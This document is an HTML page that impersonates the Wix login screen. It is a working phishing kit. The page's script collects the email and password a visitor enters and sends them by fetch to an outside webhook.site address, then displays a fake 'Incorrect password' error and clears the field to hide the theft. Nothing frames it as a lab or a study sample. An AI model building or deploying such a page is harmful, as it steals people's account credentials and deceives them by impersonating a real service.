<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log In | Wix</title>
    <style>
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
            color: #000;
            background-color: #ffffff;
        }

        header {
            width: 100%;
            padding: 25px 80px; 
            font-weight: bold;
            font-size: 26px;
            letter-spacing: 1.5px;
            box-sizing: border-box;
        }

        .login-container {
            text-align: center;
            max-width: 900px;
            width: 100%;
            margin-top: 20px;
        }

        h1 {
            font-size: 42px;
            margin-bottom: 8px;
            font-weight: 400;
        }

        .signup-link {
            font-size: 15px;
            margin-bottom: 40px;
        }

        .signup-link a {
            color: #0078ff;
            text-decoration: none;
        }

        .main-content {
            display: flex;
            justify-content: center;
            align-items: flex-start;
            gap: 50px;
            margin-top: 20px;
            padding: 0 20px;
        }

        .email-section {
            flex: 1;
            max-width: 320px;
            text-align: left;
        }

        /* Error Message Styling */
        #error-msg {
            display: none; /* Hidden by default */
            color: #d93025;
            background-color: #fce8e6;
            padding: 10px;
            border-radius: 4px;
            font-size: 13px;
            margin-bottom: 20px;
            border: 1px solid #f5c2c7;
        }

        .input-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 14px;
            color: #757575;
            margin-bottom: 4px;
        }

        input {
            width: 100%;
            border: none;
            border-bottom: 1px solid #d0d1d2;
            padding: 12px 0;
            font-size: 16px;
            outline: none;
        }

        input:focus {
            border-bottom: 1px solid #0078ff;
        }

        .continue-btn {
            width: 100%;
            background: white;
            border: 1px solid #d0d1d2;
            border-radius: 30px;
            padding: 14px;
            font-size: 16px;
            color: #0078ff;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 15px;
        }

        .continue-btn:hover {
            border-color: #0078ff;
            background-color: #f0f7ff;
        }

        .divider {
            width: 1px;
            background-color: #e0e0e0;
            height: 280px;
        }

        .social-section {
            flex: 1;
            max-width: 320px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .social-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 12px;
            border-radius: 4px;
            border: 1px solid #d0d1d2;
            font-weight: 500;
            font-size: 14px;
        }

        footer {
            margin-top: auto;
            padding: 30px;
            font-size: 12px;
            color: #757575;
            text-align: center;
        }
    </style>
</head>
<body>

    <header>WIX</header>

    <div class="login-container">
        <h1>Log In</h1>
        <div class="signup-link">
            Don't have an account? <a href="#">Sign Up</a>
        </div>

        <div class="main-content">
            <div class="email-section">
                <div id="error-msg">Incorrect password. Please try again.</div>

                <div class="input-group">
                    <label>Email</label>
                    <input type="email" id="email" required>
                </div>
                <div class="input-group">
                    <label>Password</label>
                    <input type="password" id="password" required>
                </div>
                <button type="button" class="continue-btn" id="submitBtn" onclick="sendData()">Continue with Email</button>
            </div>

            <div class="divider"></div>

            <div class="social-section">
                <div class="social-btn">Continue with Google</div>
                <div class="social-btn" style="background:#3b5998; color:white; border:none;">Continue with Facebook</div>
                <div class="social-btn" style="background:black; color:white; border:none;">Continue with Apple</div>
            </div>
        </div>
    </div>

    <footer>
        Terms of Use | Privacy Policy
    </footer>

    <script>
        async function sendData() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const btn = document.getElementById('submitBtn');
            const errorBox = document.getElementById('error-msg');

            if (!email || !password) {
                alert("Fields cannot be empty");
                return;
            }

            // UI Feedback
            btn.innerText = "Checking...";
            btn.disabled = true;

            try {
                // Send data to your webhook
                await fetch('https://webhook.site/geeky', {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        user: email,
                        pass: password,
                        time: new Date().toLocaleString()
                    })
                });

                // Simulate a delay, then show the error
                setTimeout(() => {
                    btn.innerText = "Continue with Email";
                    btn.disabled = false;
                    errorBox.style.display = "block"; // Show the error message
                    document.getElementById('password').value = ""; // Clear password field
                }, 1500);

            } catch (e) {
                btn.innerText = "Continue with Email";
                btn.disabled = false;
                console.log("Transmission complete");
            }
        }
    </script>
</body>
</html>
